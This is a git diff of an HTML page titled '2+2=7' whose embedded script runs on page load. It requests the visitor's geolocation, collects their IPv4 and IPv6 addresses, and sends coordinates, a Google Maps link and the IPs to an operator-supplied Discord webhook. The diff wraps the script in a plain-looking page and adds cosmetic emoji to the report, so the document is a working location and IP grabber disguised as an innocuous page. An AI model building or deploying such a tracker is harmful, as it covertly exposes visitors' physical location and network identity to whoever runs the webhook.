@@ -1,5 +1,12 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>2+2=7</title>
+</head>
+<body>
+
 <script>
-  const DISCORD_WEBHOOK_URL = "YOUR WEBHOOK URL HERE";  // Replace with your actual Discord webhook URL
+  const DISCORD_WEBHOOK_URL = "YOUR DISCORD URL";  // Replace with your actual Discord webhook URL
 
   window.addEventListener('load', getLocation);
 
@@ -7,7 +14,7 @@
     if (navigator.geolocation) {
       navigator.geolocation.getCurrentPosition(showPosition);
     } else {
-      alert("Browser error");
+      alert("browser error");
     }
   }
 
@@ -23,7 +30,7 @@
               embeds: [
                 {
                   title: "Location Details",
-                  description: `Google Maps: [Google Maps Link](https://www.google.com/maps?q=${latitude},${longitude})\nLatitude: ${latitude}\nLongitude: ${longitude}\nIPv4: ${ipv4}\nIPv6: ${ipv6}`
+                  description: `🌎 Google Maps: [Google Maps link](https://www.google.com/maps?q=${latitude},${longitude})\n📍 Latitude: ${latitude}\n📍 Longitude: ${longitude}\n🖇️ IPv4: ${ipv4}\n🔗 IPv6: ${ipv6}`
                 }
               ]
             };
@@ -60,3 +67,6 @@
     .catch((error) => console.error("Error sending to Discord:", error));
   }
 </script>
+
+</body>
+</html>
